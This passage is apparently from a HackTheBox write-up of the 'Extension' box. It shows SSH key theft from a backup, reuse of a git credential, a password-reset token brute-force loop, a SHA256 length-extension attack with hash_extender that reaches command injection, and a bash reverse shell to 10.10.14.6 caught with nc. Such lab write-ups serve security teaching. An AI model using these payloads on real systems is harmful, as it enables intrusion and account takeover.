    "html": "http://dev.snippet.htb/charlie/backups/src/branch/master/backup.tar.gz"
  }
}

```

I’ll decode the base64 into a file:

```

oxdf@hacky$ echo "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" | base64 -d  > backup.tar.gz
oxdf@hacky$ file backup.tar.gz
backup.tar.gz: gzip compressed data, last modified: Tue Jan  4 21:23:31 2022, from Unix, original size modulo 2^32 20480

```

### SSH

#### backup.tar.gz

This file looks like it holds a copy of charlie’s home directory:

```

oxdf@hacky$ tar tf backup.tar.gz 
home/charlie/
home/charlie/backups/
home/charlie/backups/backup.tar.gz
home/charlie/.profile
home/charlie/.bash_history
home/charlie/.bash_logout
home/charlie/.ssh/
home/charlie/.ssh/id_rsa
home/charlie/.ssh/id_rsa.pub
home/charlie/.bashrc

```

I’ll extract it, and pull the SSH key:

```

oxdf@hacky$ tar xf backup.tar.gz 
oxdf@hacky$ cat home/charlie/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAx3BQ74w6hDrMrj5bxneqSvicR8WjTBF/BEIWdzJpvWi+9onO
ufOUl0P+DE9YEv51HpOLqZ/ZuSUxzMV/Wf2Po4+aglepfGBx6GfuEm2mVH9x3T8p
...[snip]...
MaX9vAmUF9XNwolFVzU6STMreBPRshW9RK+3tcx8Elxj4y+tMQCLHLvgyyYaGbp8
iPU8FQCtjFpHKqxW0xdDDvfHUeUmiQRTZ1o3kJK6mr3QM89LJC/l7gA=
-----END RSA PRIVATE KEY-----

```

#### Connect

That key works to get a shell as charlie:

```

oxdf@hacky$ ssh -i ~/keys/extension-charlie charlie@snippet.htb
charlie@extension:~$

```

## Shell as jean

### Enumeration

There’s not much in charlie’s home directory:

```

charlie@extension:~$ ls -la
total 44
drwxr-xr-x 6 charlie charlie 4096 Jun 13 21:26 .
drwxr-xr-x 4 root    root    4096 Jan  3 01:19 ..
drwxr-xr-x 3 charlie charlie 4096 Jan  4 21:23 backups
lrwxrwxrwx 1 root    root       9 Jan  5 22:03 .bash_history -> /dev/null
-rwxr-xr-x 1 charlie charlie  220 Jan  3 01:19 .bash_logout
-rwxr-xr-x 1 charlie charlie 3771 Jan  3 01:19 .bashrc
drwx------ 2 charlie charlie 4096 Jan  4 22:45 .cache
-rwxr-xr-x 1 charlie charlie   80 Jan  5 18:09 .gitconfig
-rw-r--r-- 1 charlie charlie   72 Jun 13 21:26 .git-credentials
drwx------ 3 charlie charlie 4096 Jan  4 22:45 .gnupg
-rwxr-xr-x 1 charlie charlie  807 Jan  3 01:19 .profile
drwx------ 2 charlie charlie 4096 Jan  4 22:51 .ssh
lrwxrwxrwx 1 root    root       9 Jan  5 22:03 .viminfo -> /dev/null

```

There’s one other home directory on this box:

```

charlie@extension:/home$ ls
charlie  jean

```

charlies is able to go into jean’s home dir:

```

charlie@extension:/home/jean$ ls -la
total 52
drwxr-xr-x 5 jean jean 4096 Jun 23 17:23 .
drwxr-xr-x 4 root root 4096 Jan  3 01:19 ..
lrwxrwxrwx 1 jean jean    9 Jan  5 22:03 .bash_history -> /dev/null
-rw-r--r-- 1 jean jean  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 jean jean 3771 Apr  4  2018 .bashrc
drwx------ 2 jean jean 4096 Jan  2 22:06 .cache
-rw-rw-r-- 1 jean jean   74 Jan  3 01:39 .gitconfig
-rw-rw-rw- 1 jean jean   54 Jun 23 17:23 .git-credentials
drwx------ 3 jean jean 4096 Jan  2 22:06 .gnupg
-rw-r--r-- 1 jean jean  807 Apr  4  2018 .profile
drwx------ 4 jean jean 4096 Jun 20 12:54 projects
-rw-r--r-- 1 jean jean   75 Jan  3 00:07 .selected_editor
-rw-r--r-- 1 jean jean    0 Jan  2 22:07 .sudo_as_admin_successful
-rw------- 1 jean jean   32 Jan  5 18:22 user.txt
-rw------- 1 jean jean  937 Jun 23 17:23 .viminfo

```

charlie can’t read `user.txt`, but it is there. There’s also a `projects` folder that charlie can’t access.

`.git-credentials` is interesting, but it has the same creds I already found for jean:

```

charlie@extension:/home/jean$ cat .git-credentials 
http://jean:EHmfar1Y7ppA9O5TAIXnYnJpA@dev.snippet.htb

```

### su

I noted above that I tried to SSH with these creds and was rejected because only key auth is allowed. The password does work for jean here using `su`:

```

charlie@extension:/home/jean$ su - jean
Password: 
jean@extension:~$

```

## Shell as application in web Container

### Enumeration

The `projects` folder in jean’s home directory is now accessible, and has two projects:

```

jean@extension:~/projects$ ls
extension-src  laravel-app

```

`extension-src` has the same info as the repo on Gitea.

`laravel-app` is the application for the snippet site.

### Laravel App

#### Identify Command Injection

I did a [breakdown of Laravel applications](/2022/03/15/htb-ransom.html#beyond-root) as a Beyond Root section in the Ransom writeup, so see that for the background. The actual endpoint functions are going to exist in `app/Http/Controllers`, in various controller files. In looking through these, a bit of code jumps out in `app/Http/Controllers/AdminController.php`, in the `validateEmail` function:

```

<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Validation\ValidationException;

class AdminController extends Controller
{

    /**
     * @throws ValidationException
     */
    public function validateEmail(Request $request)
    {
        $sec = env('APP_SECRET');

        $email = urldecode($request->post('email'));
        $given = $request->post('cs');
        $actual = hash("sha256", $sec . $email);

        $array = explode("@", $email);
        $domain = end($array);

        error_log("email:" . $email);
        error_log("emailtrim:" . str_replace("\0", "", $email));
        error_log("domain:" . $domain);
        error_log("sec:" . $sec);
        error_log("given:" . $given);
        error_log("actual:" . $actual);

        if ($given !== $actual) {
            throw ValidationException::withMessages([
                'email' => "Invalid signature!",
            ]);
        } else {
            $res = shell_exec("ping -c1 -W1 $domain > /dev/null && echo 'Mail is valid!' || echo 'Mail is not valid!'");
            return Redirect::back()->with('message', trim($res));
        }

    }
}

```

If I can control the `$domain` variable, this line is command injectable:

```

$res = shell_exec("ping -c1 -W1 $domain > /dev/null && echo 'Mail is valid!' || echo 'Mail is not valid!'"

```

`$domain` is `$email` split on “@” and taking the last one.

Unfortunately, to access that line, I’ll need to know a checksum associated with the email account. That is calculated here:

```

        $sec = env('APP_SECRET');

        $email = urldecode($request->post('email'));
        $given = $request->post('cs');
        $actual = hash("sha256", $sec . $email);

```

It’s simply a SHA256 hash of the concatenated secret and the email. The `$sec` variable comes from the `.env` file. That file should be in the root of the app, but there’s only a `.env.example` file in the folder in jean’s home directory.

#### Find Use

This function is tied to a URL `/management/validate` in `routes/web.php`:

```

jean@extension:~/projects/laravel-app$ grep -ri validateemail .
./routes/web.php:    Route::post('/management/validate', 'App\Http\Controllers\AdminController@validateEmail')->name("users.validate");
./vendor/laravel/framework/src/Illuminate/Validation/Concerns/ValidatesAttributes.php:    public function validateEmail($attribute, $value, $parameters)
./vendor/laravel/ui/auth-backend/SendsPasswordResetEmails.php:        $this->validateEmail($request);
./vendor/laravel/ui/auth-backend/SendsPasswordResetEmails.php:    protected function validateEmail(Request $request)
./app/Http/Controllers/AdminController.php:    public function validateEmail(Request $request)

```

I’ll note the name of the route is `users.validate`. That is referenced in `UserView.vue`:

```

jean@extension:~/projects/laravel-app$ grep -ir users.validate .
./routes/web.php:    Route::post('/management/validate', 'App\Http\Controllers\AdminController@validateEmail')->name("users.validate");
./resources/js/Pages/UserView.vue:                                                  :href="route('users.validate')"
./public/js/app.js:              href: _ctx.route('users.validate'),

```

This is an admin route, and I’ll remember from the very beginning that charlie was the only admin user.

I’ll update my XSRF and SESS cookies, and use the same trick to reset charlie’s password:

```

oxdf@hacky$ time for i in {1..500}; do \
> curl -s http://snippet.htb/forgot-password \
> -H 'Content-Type: application/json' \
> -H 'X-Inertia: true' \
> -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' \
> -H "X-XSRF-TOKEN: $XSRF" \
> -b "XSRF-TOKEN=$XSRF; snippethtb_session=$SESS" \
> -d '{"email":"charlie@snippet.htb"}' | \
> grep -q "<title>Redirecting to" || break; \
> echo -ne "$i\r"; \
> done
500
real    1m53.561s
user    0m3.194s
sys     0m2.678s
oxdf@hacky$ curl http://snippet.htb/reset-password -H 'Content-Type: application/json' -H 'X-Inertia: true' -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' -H "X-XSRF-TOKEN: $XSRF" -b "XSRF-TOKEN=$XSRF; snippethtb_session=$SESS" -d '{"email":"charlie@snippet.htb","password":"0xdf0xdf","password_confirmation":"0xdf0xdf", "token":"3cb830bb658df751861aa4678a582588223"}'; echo
{"component":"Auth\/Login","props":{"errors":{},"auth":{"user":null},"flash":{"message":null},"status":"Your password has been reset!"},"url":"\/reset-password","version":"207fd484b7c2ceeff7800b8c8a11b3b6"}

```

```

time for i in {1..500}; do curl -s http://snippet.htb/forgot-password -H 'Content-Type: application/json' -H 'X-Inertia: true' -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' -H "X-XSRF-TOKEN: $XSRF" -b "XSRF-TOKEN=$XSRF; snippethtb_session=$SESS" -d '{"email":"charlie@snippet.htb"}' | grep -q "<title>Redirecting to" || break; echo -ne "$i\r"; done
curl http://snippet.htb/reset-password -H 'Content-Type: application/json' -H 'X-Inertia: true' -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' -H "X-XSRF-TOKEN: $XSRF" -b "XSRF-TOKEN=$XSRF; snippethtb_session=$SESS" -d '{"email":"charlie@snippet.htb","password":"0xdf0xdf","password_confirmation":"0xdf0xdf", "token":"3cb830bb658df751861aa4678a582588223"}'; echo
curl http://snippet.htb/reset-password -H 'Content-Type: application/json' -H 'X-Inertia: true' -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' -H "X-XSRF-TOKEN: $XSRF" -b "XSRF-TOKEN=$XSRF; snippethtb_session=$SESS" -d '{"email":"charlie@snippet.htb","password":"0xdf0xdf","password_confirmation":"0xdf0xdf", "token":"3cb830bb658df751861aa4678a582588224"}'; echo
curl http://snippet.htb/reset-password -H 'Content-Type: application/json' -H 'X-Inertia: true' -H 'X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6' -H "X-XSRF-TOKEN: $XSRF" -b "XSRF-TOKEN=$XSRF; snippethtb_session=$SESS" -d '{"email":"charlie@snippet.htb","password":"0xdf0xdf","password_confirmation":"0xdf0xdf", "token":"3cb830bb658df751861aa4678a582588225"}'; echo

```

Logged in as charlie, there’s a validate button for the users:

![image-20220616155009684](https://0xdfimages.gitlab.io/img/image-20220616155009684.png)

Clicking it sends shows a response in the page:

![image-20220624144128069](https://0xdfimages.gitlab.io/img/image-20220624144128069.png)

The button sends a POST requests to `/management/validate`:

```

POST /management/validate HTTP/1.1
Host: snippet.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: text/html, application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: application/json
X-Inertia: true
X-Inertia-Version: 207fd484b7c2ceeff7800b8c8a11b3b6
X-XSRF-TOKEN: eyJpdiI6IkZYZ2FRbUc3M0t2TDcrbTVkUEFIWmc9PSIsInZhbHVlIjoibG5Oa0FhSFRXRVMrdHpZeUVxYWI2TEtLM2FzeUt3a2lscFFDS3ZtcE5QNXdFVmNvdG80dFVmSCswWGg4TktMRmJvd3hWZ1RTcXB5aEF4VXBiaUJJVUlnMDRNMVFsRmRUMUFWWG1tM2ZtR25VN2Ztcklidisxb09TUkFhZWh5cnkiLCJtYWMiOiI2NDkwODcwMjU4ZTc2NWU3Mzk2ZGE3MWJmNzU2OWViYmVmMjFlNjJiODJkNjhmMWY4YjRmODlkNDBlMzhiNjRjIiwidGFnIjoiIn0=
Content-Length: 103
Origin: http://snippet.htb
Connection: close
Referer: http://snippet.htb/users
Cookie: snippethtb_session=eyJpdiI6InpKZ2p6ckFWQkdkUXQzNjhWb3lsb0E9PSIsInZhbHVlIjoiV1h3TEZQZXdzREgvVHhzemo2aUkvRHhVR2YzQ1FvR3V0RGFMN0ZXVU9LbXN1eEZXV0RueitpOCtMYlZQbmV3ME94UmxoNGVicHh3Q2JyekhoSDY2RTZUQlp1ajJmVDQrUFA3ODFncGRrd21sc3JrMmhjbEgxbS9hTVNTaVdnYVgiLCJtYWMiOiJmNmQ2NWEwZDBlZTE5ODI0MjdmYjc0ZTQzZWZiNTBkZmZjMDFiZDdkOWJhOGY2M2I4OTg1YmJkNzk5ODAyY2JkIiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6IkZYZ2FRbUc3M0t2TDcrbTVkUEFIWmc9PSIsInZhbHVlIjoibG5Oa0FhSFRXRVMrdHpZeUVxYWI2TEtLM2FzeUt3a2lscFFDS3ZtcE5QNXdFVmNvdG80dFVmSCswWGg4TktMRmJvd3hWZ1RTcXB5aEF4VXBiaUJJVUlnMDRNMVFsRmRUMUFWWG1tM2ZtR25VN2Ztcklidisxb09TUkFhZWh5cnkiLCJtYWMiOiI2NDkwODcwMjU4ZTc2NWU3Mzk2ZGE3MWJmNzU2OWViYmVmMjFlNjJiODJkNjhmMWY4YjRmODlkNDBlMzhiNjRjIiwidGFnIjoiIn0%3D

{"email":"kaleigh@snippet.htb","cs":"8df97e16b40464d10ff8bb5afbb0fd63fdff23ae9c42a499fcc077559439f715"}

```

With this request, I have a valid checksum and the email, so I’m just missing the secret.

In Repeater, I can send this as well as change the `cs` so it’s wrong. But return a 302 redirect. However, if I follow the redirect, when the `cs` is wrong, it has an error at the top:

![image-20220623204219238](https://0xdfimages.gitlab.io/img/image-20220623204219238.png)

### Hash Extension Attack

#### Background

I’ll use a hash extension attack to get past this protection. The idea is that for some hashes, because of the way it handles data in blocks, if I know the length of the secret, I can add data to the end in such a way that I can generate the new checksum, even without knowing the data at the start of the file. The reason I need to know the length of the secret is to know the length of padding applied to get the file to have no incomplete blocks. However, even if I don’t, know the length, I can brute force it trying all sorts of lengths. I previously looked at this attack in [Intense](/2020/11/14/htb-intense.html#cookie-manipulation).

#### hash\_extender

I’ll use a [tool](https://github.com/iagox86/hash_extender) called `hash_extender` to automate this math. I’ll start with a simple example:

```

oxdf@hacky$ hash_extender --data kaleigh@snippet.htb -s 8df97e16b40464d10ff8bb5afbb0fd63fdff23ae9c42a499fcc077559439f715 --append '0xdf' --secret-min=4 --secret-max=4 --out-data-format html
Type: sha256
Secret length: 4
New signature: 575db72336fe003a8aea26043f8cb6fedca93adc937a75bad6d85c7e4ca188da
New string: kaleigh%40snippet%2ehtb%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b80xdf

```

It takes in the email address and the signature, as well as the data I want to append (in this case, “0xdf”), and information about the secret length.

It returns a new signature and a string that starts with the original string, has some junk, and ends with my appended data.

#### Find Length

I can submit this data via the API endpoint to see if it works, but sending it is a bit tricky because of the binary data included there. I’ll write a Python script that reads the `hash_extender` output and checks for the “Invalid signature!” message:

```

#!/usr/bin/env python3

import requests
import sys
import urllib.parse

prox = {"http":"http://127.0.0.1:8080"}
sess = requests.session()
sess.get('http://snippet.htb', proxies=prox)
xsrf = urllib.parse.unquote(sess.cookies['XSRF-TOKEN'])

with open(sys.argv[1], 'r') as f:
    raw = f.read()

possibilities = raw.split('\n\n')

for poss in possibilities:
    _, secret_len, new_sig, new_string = [p.split( )[-1] for p in poss.split('\n')]
    print(f'\rTesting secret length: {secret_len}', end='', flush=True)
    resp = sess.post('http://snippet.htb/management/validate', data={"email": urllib.parse.unquote_to_bytes(new_string), "cs": new_sig}, headers={"X-XSRF-TOKEN": xsrf}, proxies=prox)
    if not 'Invalid signature!' in resp.text:
        print(f"\rFound length: {secret_len}" + ' '*30)
        break

```

It starts by creating a session and getting fresh cookies / tokens. It also reads the `hash_extender` output (specified as the first argument), and splits on double newline (to get the four lines for each length). Then it gets the secret length, signature, and string, messes with the encoding on the string, and sends it. If it doesn’t see the invalid signature message, it prints that it found the secret length.

I’ll generate a long list of possible secret data:

```

oxdf@hacky$ hash_extender --data kaleigh@snippet.htb -s 8df97e16b40464d10ff8bb5afbb0fd63fdff23ae9c42a499fcc077559439f715 --append '0xdf' --secret-min=4 --secret-max=80 --out-data-format=html > extensions 

```

The data added here doesn’t matter. I’m just looking for something that validates. I’ll pass that into the script, which quickly finds a secret length of 40:

```

oxdf@hacky$ time python3 check_extensions.py extensions
Found length: 40                              

real    0m16.744s
user    0m0.289s
sys     0m0.026s

```

### Shell

Knowing the length, I’ll generate a reverse shell payload. Since it’s splitting on “@” to get the domain, I’ll add that to cut off all the junk, and then the command injection payload:

```

oxdf@hacky$ hash_extender --data kaleigh@snippet.htb -s 8df97e16b40464d10ff8bb5afbb0fd63fdff23ae9c42a499fcc077559439f715 --append '@$(bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1")' --secret-min=40 --secret-max=40 -out-data-format=html > extension-rev

```

I only need one secret length this time. I’ll use the same script to trigger it:

```

oxdf@hacky$ python3 check_extensions.py extension-rev 
Testing secret length: 40

```

It hangs, but at `nc` there’s a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.10.224 46270
bash: cannot set terminal process group (47): Inappropriate ioctl for device
bash: no job control in this shell
application@d035affaa4ca:/var/www/html/public$ 

```

I’ll [upgrade my shell](https://www.youtube.com/watch?v=DqE6DxqJg8Q) with `script` and `stty`:

```

application@d035affaa4ca:/var/www/html/public$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
application@d035affaa4ca:/var/www/html/public$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
application@d035affaa4ca:/var/www/html/public$ 

```

## Shell as root

### Enumeration

#### Docker

This shell is running as application (a user that wasn’t on the host machine) on the hostname 4dae106254bf:

```

application@4dae106254bf:/$ hostname
4dae106254bf

```

It has IPs on the 172.21.0.3/16 and 172.18.0.4/16 subnets:

```

application@4dae106254bf:/$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.21.0.3  netmask 255.255.0.0  broadcast 172.21.255.255
        ether 02:42:ac:15:00:03  txqueuelen 0  (Ethernet)
        RX packets 197398  bytes 40514610 (38.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 201523  bytes 241555646 (230.3 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.4  netmask 255.255.0.0  broadcast 172.18.255.255
        ether 02:42:ac:12:00:04  txqueuelen 0  (Ethernet)
        RX packets 39  bytes 3094 (3.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 15553 (15.1 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
